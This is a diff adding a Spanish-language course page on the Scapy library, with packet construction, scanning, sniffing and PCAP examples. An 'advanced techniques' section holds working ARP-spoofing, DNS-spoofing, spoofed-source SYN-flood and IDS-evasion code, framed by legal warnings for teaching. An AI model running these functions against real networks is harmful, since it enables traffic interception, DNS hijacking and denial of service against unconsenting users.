@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sesión 5: Herramientas y Bibliotecas para Ciberseguridad</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div>SESIÓN 5: Herramientas y Bibliotecas para Ciberseguridad</div>
+    </header>
+
+    <section class="contenido-didactico">
+        <h1>BLOQUE 1: Scapy - Manipulación de Paquetes de Red</h1>
+
+        <h2>1.1 Introducción a Scapy</h2>
+
+        <p>
+            <strong>Scapy</strong> es una poderosa biblioteca de Python para la manipulación de paquetes de red. Permite crear, enviar, capturar y analizar paquetes a bajo nivel, ofreciendo un control total sobre las comunicaciones de red.
+        </p>
+
+        <details>
+            <summary>Instalación y requisitos</summary>
+            <p>
+                Para instalar Scapy, ejecuta: <code>pip install scapy</code>
+            </p>
+            <p>
+                <strong>Nota importante:</strong> Muchas funciones de Scapy requieren privilegios de root o administrador para acceder directamente a las interfaces de red.
+            </p>
+        </details>
+
+        <h3>Capacidades de Scapy</h3>
+
+        <p>Scapy permite realizar las siguientes operaciones:</p>
+
+        <ul>
+            <li>Crear paquetes personalizados de cualquier protocolo</li>
+            <li>Enviar y recibir paquetes a nivel de red</li>
+            <li>Capturar tráfico de red (similar a Wireshark)</li>
+            <li>Realizar escaneos avanzados (SYN, UDP, ARP)</li>
+            <li>Análisis forense de capturas PCAP</li>
+        </ul>
+
+        <h3>Modelo de capas en Scapy</h3>
+
+        <p>Scapy trabaja con un modelo de capas que se apilan usando el operador <code>/</code>:</p>
+
+        <dl>
+            <dt>Ether()</dt>
+            <dd>Capa 2 (Enlace): Direcciones MAC</dd>
+
+            <dt>ARP()</dt>
+            <dd>Protocolo ARP para resolución de direcciones</dd>
+
+            <dt>IP()</dt>
+            <dd>Capa 3 (Red): Direcciones IP</dd>
+
+            <dt>ICMP()</dt>
+            <dd>Protocolo ICMP (usado en ping)</dd>
+
+            <dt>TCP()</dt>
+            <dd>Capa 4 (Transporte): Protocolo TCP</dd>
+
+            <dt>UDP()</dt>
+            <dd>Capa 4 (Transporte): Protocolo UDP</dd>
+
+            <dt>DNS()</dt>
+            <dd>Capa 7 (Aplicación): Protocolo DNS</dd>
+
+            <dt>Raw()</dt>
+            <dd>Datos crudos (payload)</dd>
+        </dl>
+
+        <p>
+            <strong>Ejemplo de construcción:</strong> <code>Ether()/IP()/TCP()/Raw("datos")</code>
+        </p>
+
+        <h3>Construcción de paquetes</h3>
+
+        <p>A continuación, ejemplos de cómo construir diferentes tipos de paquetes con Scapy:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Scapy: Biblioteca para manipulación de paquetes de red
+Permite crear, enviar, capturar y analizar paquetes a bajo nivel
+
+INSTALACIÓN:
+pip install scapy
+
+NOTA: Muchas funciones requieren privilegios de root/administrador
+"""
+
+# ========================================
+# IMPORTACIÓN Y CONCEPTOS BÁSICOS
+# ========================================
+
+from scapy.all import *
+import sys
+
+# Suprimir warnings de IPv6
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+print("""
+╔═══════════════════════════════════════════════════════════════════╗
+║                    SCAPY - MANIPULACIÓN DE PAQUETES               ║
+╠═══════════════════════════════════════════════════════════════════╣
+║  Scapy permite:                                                   ║
+║  • Crear paquetes personalizados (cualquier protocolo)            ║
+║  • Enviar y recibir paquetes a nivel de red                       ║
+║  • Capturar tráfico (como Wireshark)                              ║
+║  • Realizar escaneos avanzados (SYN, UDP, ARP)                    ║
+║  • Análisis forense de capturas PCAP                              ║
+╚═══════════════════════════════════════════════════════════════════╝
+""")
+
+# ========================================
+# CAPAS DE RED EN SCAPY
+# ========================================
+
+"""
+MODELO DE CAPAS EN SCAPY:
+
+Ether()  - Capa 2 (Enlace): MAC addresses
+ARP()    - Protocolo ARP
+IP()     - Capa 3 (Red): Direcciones IP
+ICMP()   - Protocolo ICMP (ping)
+TCP()    - Capa 4 (Transporte): TCP
+UDP()    - Capa 4 (Transporte): UDP
+DNS()    - Capa 7 (Aplicación): DNS
+Raw()    - Datos crudos (payload)
+
+Los paquetes se construyen apilando capas con "/"
+Ejemplo: Ether()/IP()/TCP()/Raw("datos")
+"""
+
+# ========================================
+# CONSTRUCCIÓN DE PAQUETES
+# ========================================
+
+print("=== CONSTRUCCIÓN DE PAQUETES ===\n")
+
+# Crear un paquete IP simple
+paquete_ip = IP(dst="8.8.8.8")
+print(f"Paquete IP básico:")
+print(f"  Destino: {paquete_ip.dst}")
+print(f"  Origen (auto): {paquete_ip.src}")
+print(f"  TTL: {paquete_ip.ttl}")
+
+# Crear paquete ICMP (ping)
+paquete_icmp = IP(dst="8.8.8.8")/ICMP()
+print(f"\nPaquete ICMP (Ping):")
+paquete_icmp.show2()  # Muestra estructura detallada
+
+# Crear paquete TCP
+paquete_tcp = IP(dst="scanme.nmap.org")/TCP(dport=80, flags="S")
+print(f"\nPaquete TCP SYN:")
+print(f"  Destino: {paquete_tcp[IP].dst}:{paquete_tcp[TCP].dport}")
+print(f"  Flags: {paquete_tcp[TCP].flags}")
+
+# Paquete HTTP (TCP + datos)
+paquete_http = IP(dst="example.com")/TCP(dport=80, flags="PA")/Raw(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
+print(f"\nPaquete HTTP:")
+print(f"  Tamaño total: {len(paquete_http)} bytes")
+
+
+# ========================================
+# VISUALIZACIÓN DE PAQUETES
+# ========================================
+
+print("\n=== VISUALIZACIÓN DE PAQUETES ===\n")
+
+paquete = IP(dst="192.168.1.1")/TCP(dport=443, flags="S")
+
+# Diferentes formas de ver un paquete
+print("Resumen (summary):")
+print(f"  {paquete.summary()}")
+
+print("\nCapas del paquete:")
+print(f"  {paquete.layers()}")
+
+print("\nCampos modificables:")
+print(f"  IP: {[f.name for f in IP().fields_desc][:8]}...")
+print(f"  TCP: {[f.name for f in TCP().fields_desc][:8]}...")
+
+# Exportar a bytes
+print(f"\nBytes del paquete: {bytes(paquete)[:30]}...")
+print(f"Hexdump:")
+hexdump(paquete)</code></pre>
+
+        <h2>1.2 Envío y Recepción de Paquetes</h2>
+
+        <p>Scapy proporciona varias funciones para enviar y recibir paquetes de red. Es importante comprender las diferencias entre ellas:</p>
+
+        <h3>Funciones de envío</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Función</th>
+                    <th>Descripción</th>
+                    <th>Capa</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>send()</code></td>
+                    <td>Envía paquetes sin esperar respuesta</td>
+                    <td>Capa 3 (IP)</td>
+                </tr>
+                <tr>
+                    <td><code>sendp()</code></td>
+                    <td>Envía paquetes a nivel de enlace</td>
+                    <td>Capa 2 (Ethernet)</td>
+                </tr>
+                <tr>
+                    <td><code>sr()</code></td>
+                    <td>Send & Receive: envía y espera respuestas</td>
+                    <td>Capa 3</td>
+                </tr>
+                <tr>
+                    <td><code>sr1()</code></td>
+                    <td>Envía y retorna primera respuesta</td>
+                    <td>Capa 3</td>
+                </tr>
+                <tr>
+                    <td><code>srp()</code></td>
+                    <td>Send & Receive a nivel de capa 2</td>
+                    <td>Capa 2</td>
+                </tr>
+                <tr>
+                    <td><code>srp1()</code></td>
+                    <td>Como srp() pero retorna solo primera respuesta</td>
+                    <td>Capa 2</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <p><strong>Parámetros comunes:</strong></p>
+        <ul>
+            <li><code>timeout</code>: tiempo de espera para respuestas</li>
+            <li><code>retry</code>: número de reintentos</li>
+            <li><code>verbose</code>: nivel de verbosidad (0=silencioso)</li>
+        </ul>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Scapy: Envío y recepción de paquetes
+NOTA: Requiere privilegios de root/administrador
+"""
+
+from scapy.all import *
+
+# ========================================
+# FUNCIONES DE ENVÍO
+# ========================================
+
+"""
+FUNCIONES DE ENVÍO EN SCAPY:
+
+send()     - Envía paquetes a nivel de capa 3 (IP)
+sendp()    - Envía paquetes a nivel de capa 2 (Ethernet)
+sr()       - Send & Receive: envía y espera respuestas (capa 3)
+sr1()      - Send & Receive 1: envía y retorna primera respuesta
+srp()      - Send & Receive a nivel de capa 2
+srp1()     - Send & Receive 1 a nivel de capa 2
+
+Parámetros comunes:
+- timeout: tiempo de espera para respuestas
+- retry: número de reintentos
+- verbose: nivel de verbosidad (0=silencioso)
+"""
+
+# ========================================
+# PING CON SCAPY
+# ========================================
+
+def ping_scapy(destino, timeout=2):
+    """
+    Realiza ping usando ICMP con Scapy.
+    Equivalente a: ping -c 1 destino
+    """
+    print(f"\n[*] Ping a {destino}")
+    
+    # Crear paquete ICMP Echo Request
+    paquete = IP(dst=destino)/ICMP()
+    
+    try:
+        # Enviar y esperar respuesta
+        respuesta = sr1(paquete, timeout=timeout, verbose=0)
+        
+        if respuesta:
+            print(f"[+] Respuesta de {respuesta.src}")
+            print(f"    TTL: {respuesta.ttl}")
+            print(f"    Tiempo: {respuesta.time - paquete.sent_time:.4f}s")
+            return True
+        else:
+            print(f"[-] Sin respuesta (timeout)")
+            return False
+    
+    except PermissionError:
+        print("[-] Error: Se requieren privilegios de root")
+        return None
+
+
+# ========================================
+# TRACEROUTE CON SCAPY
+# ========================================
+
+def traceroute_scapy(destino, max_ttl=30, timeout=2):
+    """
+    Implementa traceroute usando Scapy.
+    Envía paquetes con TTL incrementando.
+    """
+    print(f"\n[*] Traceroute a {destino} (max TTL: {max_ttl})")
+    print(f"{'HOP':<5} {'IP':<20} {'RTT':<10}")
+    print("-" * 40)
+    
+    for ttl in range(1, max_ttl + 1):
+        # Crear paquete con TTL específico
+        paquete = IP(dst=destino, ttl=ttl)/ICMP()
+        
+        try:
+            respuesta = sr1(paquete, timeout=timeout, verbose=0)
+            
+            if respuesta:
+                rtt = (respuesta.time - paquete.sent_time) * 1000
+                print(f"{ttl:<5} {respuesta.src:<20} {rtt:.2f} ms")
+                
+                # Si llegamos al destino, terminar
+                if respuesta.src == destino:
+                    print(f"\n[+] Destino alcanzado en {ttl} saltos")
+                    break
+                
+                # ICMP Time Exceeded = router intermedio
+                if respuesta.type == 11:
+                    continue
+            else:
+                print(f"{ttl:<5} {'*':<20} {'timeout':<10}")
+        
+        except PermissionError:
+            print("[-] Error: Se requieren privilegios de root")
+            break
+    
+    return ttl
+
+
+# ========================================
+# ESCANEO SYN (HALF-OPEN)
+# ========================================
+
+def escaneo_syn(objetivo, puertos, timeout=2):
+    """
+    Escaneo SYN (half-open/stealth scan).
+    Envía SYN, si recibe SYN-ACK el puerto está abierto.
+    
+    Ventajas:
+    - Más sigiloso que conexión completa
+    - Más rápido
+    - No deja logs de conexión completa
+    """
+    print(f"\n[*] Escaneo SYN a {objetivo}")
+    print(f"[*] Puertos: {puertos[0]}-{puertos[-1] if len(puertos) > 1 else puertos[0]}")
+    print("-" * 50)
+    
+    puertos_abiertos = []
+    
+    try:
+        for puerto in puertos:
+            # Crear paquete SYN
+            paquete = IP(dst=objetivo)/TCP(dport=puerto, flags="S")
+            
+            # Enviar y esperar respuesta
+            respuesta = sr1(paquete, timeout=timeout, verbose=0)
+            
+            if respuesta:
+                # Verificar flags de respuesta
+                if respuesta.haslayer(TCP):
+                    flags = respuesta[TCP].flags
+                    
+                    # SYN-ACK = Puerto abierto
+                    if flags == 0x12:  # SYN-ACK
+                        puertos_abiertos.append(puerto)
+                        print(f"[+] Puerto {puerto}/tcp ABIERTO")
+                        
+                        # Enviar RST para cerrar conexión
+                        rst = IP(dst=objetivo)/TCP(dport=puerto, flags="R")
+                        send(rst, verbose=0)
+                    
+                    # RST = Puerto cerrado
+                    elif flags == 0x14:  # RST-ACK
+                        pass  # Puerto cerrado
+            else:
+                # Sin respuesta = filtrado o perdido
+                pass
+    
+    except PermissionError:
+        print("[-] Error: Se requieren privilegios de root")
+        return []
+    
+    print(f"\n[*] Puertos abiertos: {len(puertos_abiertos)}")
+    return puertos_abiertos
+
+
+# ========================================
+# ESCANEO ARP (DESCUBRIMIENTO DE RED)
+# ========================================
+
+def escaneo_arp(red, timeout=2):
+    """
+    Descubre hosts en la red local usando ARP.
+    Solo funciona en la misma subred.
+    
+    Ejemplo: escaneo_arp("192.168.1.0/24")
+    """
+    print(f"\n[*] Escaneo ARP en {red}")
+    print("-" * 50)
+    
+    try:
+        # Crear paquete ARP broadcast
+        # Ether(dst="ff:ff:ff:ff:ff:ff") = broadcast
+        # ARP(pdst=red) = solicitar IP
+        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red)
+        
+        # Enviar y recibir respuestas
+        respuestas, sin_respuesta = srp(arp_request, timeout=timeout, verbose=0)
+        
+        hosts = []
+        print(f"{'IP':<20} {'MAC':<20}")
+        print("-" * 40)
+        
+        for enviado, recibido in respuestas:
+            ip = recibido.psrc
+            mac = recibido.hwsrc
+            hosts.append({'ip': ip, 'mac': mac})
+            print(f"{ip:<20} {mac:<20}")
+        
+        print(f"\n[+] {len(hosts)} hosts encontrados")
+        return hosts
+    
+    except PermissionError:
+        print("[-] Error: Se requieren privilegios de root")
+        return []
+
+
+# ========================================
+# SNIFFING DE PAQUETES
+# ========================================
+
+def capturar_paquetes(interfaz=None, filtro=None, cantidad=10):
+    """
+    Captura paquetes de la red (como Wireshark/tcpdump).
+    
+    Filtros BPF comunes:
+    - "tcp port 80"
+    - "icmp"
+    - "host 192.168.1.1"
+    - "tcp and port 443"
+    """
+    print(f"\n[*] Capturando {cantidad} paquetes...")
+    if filtro:
+        print(f"[*] Filtro: {filtro}")
+    print("-" * 50)
+    
+    def procesar_paquete(paquete):
+        """Callback para cada paquete capturado."""
+        # Resumen simple
+        print(paquete.summary())
+        
+        # Para análisis más detallado:
+        # if paquete.haslayer(TCP):
+        #     print(f"  TCP: {paquete[IP].src}:{paquete[TCP].sport} -> "
+        #           f"{paquete[IP].dst}:{paquete[TCP].dport}")
+    
+    try:
+        # Capturar paquetes
+        paquetes = sniff(
+            iface=interfaz,
+            filter=filtro,
+            count=cantidad,
+            prn=procesar_paquete,
+            store=True
+        )
+        
+        print(f"\n[+] Capturados {len(paquetes)} paquetes")
+        return paquetes
+    
+    except PermissionError:
+        print("[-] Error: Se requieren privilegios de root")
+        return None
+
+
+# ========================================
+# ANÁLISIS DE ARCHIVOS PCAP
+# ========================================
+
+def analizar_pcap(archivo):
+    """
+    Lee y analiza un archivo PCAP.
+    """
+    print(f"\n[*] Analizando {archivo}")
+    print("-" * 50)
+    
+    try:
+        paquetes = rdpcap(archivo)
+        
+        print(f"[+] Total de paquetes: {len(paquetes)}")
+        
+        # Estadísticas
+        protocolos = {}
+        ips_origen = {}
+        ips_destino = {}
+        
+        for paquete in paquetes:
+            # Contar protocolos
+            for capa in paquete.layers():
+                nombre = capa.__name__
+                protocolos[nombre] = protocolos.get(nombre, 0) + 1
+            
+            # Contar IPs
+            if paquete.haslayer(IP):
+                src = paquete[IP].src
+                dst = paquete[IP].dst
+                ips_origen[src] = ips_origen.get(src, 0) + 1
+                ips_destino[dst] = ips_destino.get(dst, 0) + 1
+        
+        print(f"\n[*] Protocolos encontrados:")
+        for proto, cuenta in sorted(protocolos.items(), key=lambda x: -x[1])[:10]:
+            print(f"    {proto}: {cuenta}")
+        
+        print(f"\n[*] Top IPs origen:")
+        for ip, cuenta in sorted(ips_origen.items(), key=lambda x: -x[1])[:5]:
+            print(f"    {ip}: {cuenta}")
+        
+        print(f"\n[*] Top IPs destino:")
+        for ip, cuenta in sorted(ips_destino.items(), key=lambda x: -x[1])[:5]:
+            print(f"    {ip}: {cuenta}")
+        
+        return paquetes
+    
+    except FileNotFoundError:
+        print(f"[-] Archivo no encontrado: {archivo}")
+        return None
+
+
+# ========================================
+# EJEMPLO DE USO
+# ========================================
+
+if __name__ == "__main__":
+    print("=== EJEMPLOS DE SCAPY ===")
+    print("\nNOTA: La mayoría requiere privilegios de root/administrador")
+    print("\nEjemplos disponibles:")
+    print("  1. Ping")
+    print("  2. Traceroute")
+    print("  3. Escaneo SYN")
+    print("  4. Escaneo ARP")
+    print("  5. Captura de paquetes")
+    
+    # Ejemplo sin privilegios: construcción de paquetes
+    print("\n--- Ejemplo sin root: Construcción de paquetes ---")
+    
+    paquete = IP(dst="8.8.8.8")/TCP(dport=80, flags="S")
+    print(f"\nPaquete construido:")
+    print(f"  {paquete.summary()}")
+    print(f"  Bytes: {len(bytes(paquete))}")
+    
+    # Descomenta para ejecutar con root:
+    # ping_scapy("8.8.8.8")
+    # escaneo_syn("scanme.nmap.org", range(1, 100))
+    # escaneo_arp("192.168.1.0/24")</code></pre>
+
+        <h2>1.3 Ataques y Técnicas Avanzadas con Scapy</h2>
+
+        <div class="advertencia">
+            <p><strong>ADVERTENCIA IMPORTANTE:</strong></p>
+            <p>Las técnicas presentadas en esta sección son <strong>solo para propósitos educativos</strong> y deben usarse exclusivamente en:</p>
+            <ul>
+                <li>Entornos de laboratorio propios</li>
+                <li>Pruebas autorizadas (pentesting con contrato)</li>
+                <li>Redes y sistemas de tu propiedad</li>
+            </ul>
+            <p>El uso no autorizado de estas técnicas es <strong>ILEGAL</strong> y puede tener consecuencias legales graves.</p>
+        </div>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Scapy: Técnicas avanzadas de red
+¡ADVERTENCIA! Solo usar en entornos autorizados
+"""
+
+from scapy.all import *
+import random
+
+# ========================================
+# ARP SPOOFING (MitM)
+# ========================================
+
+def arp_spoof(ip_victima, ip_gateway, interfaz=None):
+    """
+    ARP Spoofing: Envenena la tabla ARP de la víctima.
+    Permite posicionarse como Man-in-the-Middle.
+    
+    ¡SOLO PARA PROPÓSITOS EDUCATIVOS EN REDES PROPIAS!
+    """
+    print(f"\n[!] ARP Spoofing")
+    print(f"[*] Víctima: {ip_victima}")
+    print(f"[*] Gateway: {ip_gateway}")
+    print("[!] Ctrl+C para detener\n")
+    
+    try:
+        # Obtener MAC de la víctima
+        mac_victima = getmacbyip(ip_victima)
+        if not mac_victima:
+            print(f"[-] No se pudo obtener MAC de {ip_victima}")
+            return
+        
+        print(f"[+] MAC víctima: {mac_victima}")
+        
+        # Crear paquete ARP falso
+        # Decimos a la víctima que nosotros somos el gateway
+        paquete_victima = ARP(
+            op=2,  # ARP Reply
+            pdst=ip_victima,
+            hwdst=mac_victima,
+            psrc=ip_gateway  # Fingimos ser el gateway
+        )
+        
+        # También envenenamos al gateway (bidireccional)
+        mac_gateway = getmacbyip(ip_gateway)
+        paquete_gateway = ARP(
+            op=2,
+            pdst=ip_gateway,
+            hwdst=mac_gateway,
+            psrc=ip_victima  # Fingimos ser la víctima
+        )
+        
+        contador = 0
+        while True:
+            send(paquete_victima, verbose=0)
+            send(paquete_gateway, verbose=0)
+            contador += 1
+            print(f"\r[*] Paquetes enviados: {contador * 2}", end="")
+            time.sleep(2)
+    
+    except KeyboardInterrupt:
+        print("\n\n[*] Detenido. Restaurando tablas ARP...")
+        restaurar_arp(ip_victima, ip_gateway)
+    except PermissionError:
+        print("[-] Se requieren privilegios de root")
+
+
+def restaurar_arp(ip_victima, ip_gateway):
+    """Restaura las tablas ARP legítimas."""
+    mac_victima = getmacbyip(ip_victima)
+    mac_gateway = getmacbyip(ip_gateway)
+    
+    # Enviar ARP correctos
+    send(ARP(op=2, pdst=ip_victima, hwdst=mac_victima,
+             psrc=ip_gateway, hwsrc=mac_gateway), count=5, verbose=0)
+    send(ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway,
+             psrc=ip_victima, hwsrc=mac_victima), count=5, verbose=0)
+    
+    print("[+] Tablas ARP restauradas")
+
+
+# ========================================
+# DNS SPOOFING
+# ========================================
+
+def dns_spoof(paquete, dominio_falso, ip_falsa):
+    """
+    Callback para modificar respuestas DNS.
+    Usar con sniff() para interceptar consultas DNS.
+    """
+    if paquete.haslayer(DNS) and paquete.haslayer(DNSQR):
+        # Verificar si es consulta del dominio objetivo
+        qname = paquete[DNSQR].qname.decode()
+        
+        if dominio_falso in qname:
+            print(f"[!] Interceptado: {qname}")
+            
+            # Crear respuesta DNS falsa
+            respuesta = IP(dst=paquete[IP].src, src=paquete[IP].dst) / \
+                       UDP(dport=paquete[UDP].sport, sport=53) / \
+                       DNS(
+                           id=paquete[DNS].id,
+                           qr=1,  # Es respuesta
+                           aa=1,  # Authoritative
+                           qd=paquete[DNS].qd,
+                           an=DNSRR(
+                               rrname=qname,
+                               ttl=300,
+                               rdata=ip_falsa
+                           )
+                       )
+            
+            send(respuesta, verbose=0)
+            print(f"[+] Enviada respuesta falsa: {qname} -> {ip_falsa}")
+
+
+# ========================================
+# SYN FLOOD (DoS)
+# ========================================
+
+def syn_flood(objetivo, puerto, duracion=10):
+    """
+    Ataque SYN Flood: Inunda con paquetes SYN.
+    Agota recursos del servidor con conexiones half-open.
+    
+    ¡SOLO PARA PROPÓSITOS EDUCATIVOS!
+    """
+    print(f"\n[!] SYN Flood a {objetivo}:{puerto}")
+    print(f"[*] Duración: {duracion} segundos")
+    print("[!] Ctrl+C para detener\n")
+    
+    import time
+    inicio = time.time()
+    contador = 0
+    
+    try:
+        while time.time() - inicio < duracion:
+            # IP y puerto origen aleatorios
+            ip_origen = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            puerto_origen = random.randint(1024, 65535)
+            
+            # Crear paquete SYN con datos falsos
+            paquete = IP(src=ip_origen, dst=objetivo) / \
+                     TCP(sport=puerto_origen, dport=puerto, flags="S")
+            
+            send(paquete, verbose=0)
+            contador += 1
+            
+            if contador % 100 == 0:
+                print(f"\r[*] Paquetes enviados: {contador}", end="")
+    
+    except KeyboardInterrupt:
+        pass
+    except PermissionError:
+        print("[-] Se requieren privilegios de root")
+        return
+    
+    print(f"\n\n[*] Total enviados: {contador}")
+
+
+# ========================================
+# DETECCIÓN DE SNIFFER
+# ========================================
+
+def detectar_modo_promiscuo(red):
+    """
+    Detecta hosts en modo promiscuo (posibles sniffers).
+    Técnica: Enviar ARP con MAC destino incorrecta.
+    Hosts normales ignoran, promiscuos responden.
+    """
+    print(f"\n[*] Detectando sniffers en {red}")
+    
+    # MAC que no existe (broadcast pero no ff:ff:ff:ff:ff:ff)
+    mac_falsa = "ff:ff:ff:ff:ff:fe"
+    
+    # Crear ARP request con MAC destino falsa
+    paquete = Ether(dst=mac_falsa)/ARP(pdst=red)
+    
+    try:
+        respuestas, _ = srp(paquete, timeout=3, verbose=0)
+        
+        if respuestas:
+            print("[!] Posibles sniffers detectados:")
+            for _, recibido in respuestas:
+                print(f"    {recibido.psrc} ({recibido.hwsrc})")
+        else:
+            print("[+] No se detectaron sniffers")
+    
+    except PermissionError:
+        print("[-] Se requieren privilegios de root")
+
+
+# ========================================
+# EVASIÓN DE IDS: FRAGMENTACIÓN
+# ========================================
+
+def enviar_fragmentado(objetivo, puerto, payload):
+    """
+    Envía datos fragmentados para evadir IDS.
+    Los IDS simples no reensamblan fragmentos.
+    """
+    print(f"\n[*] Enviando payload fragmentado a {objetivo}:{puerto}")
+    
+    # Crear paquete base
+    paquete = IP(dst=objetivo)/TCP(dport=puerto)/Raw(payload)
+    
+    # Fragmentar (tamaño pequeño)
+    fragmentos = fragment(paquete, fragsize=8)
+    
+    print(f"[*] Fragmentos creados: {len(fragmentos)}")
+    
+    for i, frag in enumerate(fragmentos):
+        print(f"    Fragmento {i+1}: {len(frag)} bytes, offset={frag.frag}")
+        send(frag, verbose=0)
+    
+    print("[+] Enviado")
+
+
+# ========================================
+# EJEMPLO DE USO
+# ========================================
+
+if __name__ == "__main__":
+    print("""
+╔═══════════════════════════════════════════════════════════════════╗
+║                    TÉCNICAS AVANZADAS - SCAPY                     ║
+╠═══════════════════════════════════════════════════════════════════╣
+║      ADVERTENCIA: Estas técnicas son solo para:                   ║
+║      • Entornos de laboratorio propios                            ║
+║      • Pruebas autorizadas (pentesting con contrato)              ║
+║      • Propósitos educativos                                      ║
+║                                                                   ║
+║  El uso no autorizado es ILEGAL y puede tener                     ║
+║  consecuencias legales graves.                                    ║
+╚═══════════════════════════════════════════════════════════════════╝
+""")
+    
+    print("Técnicas disponibles:")
+    print("  1. ARP Spoofing (MitM)")
+    print("  2. DNS Spoofing")
+    print("  3. SYN Flood")
+    print("  4. Detección de sniffers")
+    print("  5. Fragmentación (evasión IDS)")
+    print("\nEstas funciones requieren privilegios de root y")
+    print("deben usarse solo en entornos controlados.")</code></pre>
+    </section>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script src="script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js"></script>
+</body>
+</html>                    
